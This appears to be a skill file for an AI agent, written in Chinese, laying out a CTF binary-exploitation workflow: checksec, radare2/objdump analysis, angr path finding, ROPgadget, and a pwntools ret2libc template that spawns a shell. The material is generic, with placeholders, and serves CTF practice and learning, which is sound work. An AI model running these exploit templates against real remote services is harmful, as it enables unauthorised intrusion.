---
name: binary
description: triggers: BINARY, 二进制, binary漏洞, 逆向, 缓冲区溢出, fuzzing, pwntools, angr, ghidra, rop, 堆漏洞, 栈溢出, 格式化字符串
---

# BINARY 二进制漏洞挖掘 — CTF 自动化工作流

对二进制程序执行逆向分析 + 漏洞挖掘：防护检测 → 静态分析 → 动态调试 → 符号执行 → 利用构造。

## 工具清单

| 工具 | 安装 | 用途 |
|---|---|---|
| pwntools | `pip install pwntools` | 漏洞利用框架 |
| angr | `pip install angr` | 符号执行/自动求解 |
| ROPgadget | `pip install ROPgadget` | ROP 链生成 |
| checksec | pwntools 自带 | 防护检测 |
| Ghidra | 手动下载 | 反编译/静态分析 |
| radare2 | `scoop install radare2` | 逆向框架 |
| gdb | 可选 | 动态调试 |

## 工作流：五阶段推进

### 阶段 1: 初步侦察 Recon

```bash
# 1a. 文件类型识别
file <binary>
strings <binary> | head -100

# 1b. 防护检测（pwntools checksec）
python -c "from pwn import *; print(ELF('<binary>'))"
python -c "from pwn import *; e=ELF('<binary>'); print(f'Arch: {e.arch}, PIE: {e.pie}, NX: {e.nx}, RELRO: {e.relro}, Canary: {e.canary}')"

# 1c. 符号表/导入函数
nm <binary> 2>/dev/null || objdump -T <binary>
objdump -d <binary> | head -200  # 反汇编入口
```

### 阶段 2: 静态分析 Static

```bash
# 2a. Ghidra headless 反编译（如果装了）
# ghidra_headless -import <binary> -postScript DecompileScript.java

# 2b. radare2 快速分析
r2 -A -c "aaa; afl; q" <binary>  # 列出所有函数
r2 -A -c "aaa; pdb @ main; q" <binary>  # 反编译 main

# 2c. 危险函数搜索
strings <binary> | grep -E "flag|password|secret|key|admin"
# 找危险调用
objdump -d <binary> | grep -E "gets|scanf|strcpy|sprintf|system|execve|read"
```

### 阶段 3: 符号执行 Symbolic

```bash
# 3a. angr 自动找可达路径
python << 'EOF'
import angr
proj = angr.Project('<binary>', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
# 找 "Correct" / "flag" 路径
simgr.explore(find=lambda s: b"flag" in s.posix.dumps(1) or b"Correct" in s.posix.dumps(1))
if simgr.found:
    print("Found! Input:", simgr.found[0].posix.dumps(0))
EOF

# 3b. 找特定地址路径
python << 'EOF'
import angr
proj = angr.Project('<binary>', auto_load_libs=False)
simgr = proj.factory.simulation_manager()
simgr.explore(find=0x<target_addr>, avoid=0x<avoid_addr>)
if simgr.found:
    print("Path found:", simgr.found[0].posix.dumps(0))
EOF
```

### 阶段 4: 利用构造 Exploit

```bash
# 4a. ROPgadget 找 gadget
ROPgadget --binary <binary> --ropchain
ROPgadget --binary <binary> | grep "pop rdi"
ROPgadget --binary <binary> | grep "ret"

# 4b. one_gadget（如果装了）
# one_gadget <libc>

# 4c. pwntools 模板
python << 'EOF'
from pwn import *
context.arch = 'amd64'  # 根据实际架构
# p = process('./<binary>')
p = remote('<host>', <port>)
# 构造 payload
offset = <N>  # 通过 pattern create/offset 确定
# payload = b'A' * offset + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
# p.sendline(payload)
# p.interactive()
EOF
```

### 阶段 5: 记录 Findings

用 findings skill 记录：
- 漏洞类型（栈溢出/堆溢出/格式化字符串/整数溢出/UAF）
- 防护绕过情况
- 利用方式
- 证据

## 命令模板速查

### pwntools 快速模板

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

# 本地
p = process('./binary')
# 远程
# p = remote('host', port)

# 找 offset
# pattern_create 200 → 输入 → 看 crash 地址 → pattern_offset

# ROP 链
elf = ELF('./binary')
# libc = ELF('./libc.so.6')

payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(next(elf.search(b'/bin/sh')))
payload += p64(elf.plt['system'])

p.sendline(payload)
p.interactive()
```

## 判定规则

1. **checksec 无 Canary + 有栈溢出** → 可直接 ROP，Critical
2. **checksec 无 PIE + 有危险函数调用** → 地址固定，High
3. **angr 找到 flag 路径** → 直接记录
4. **有 system 且有 /bin/sh 字符串** → ret2libc 可直用

## 无工具回退

如果没有 Ghidra/radare2，只用 objdump + strings + pwntools：
- `objdump -d` 反汇编
- `strings` 找线索
- `pwntools` 做 exp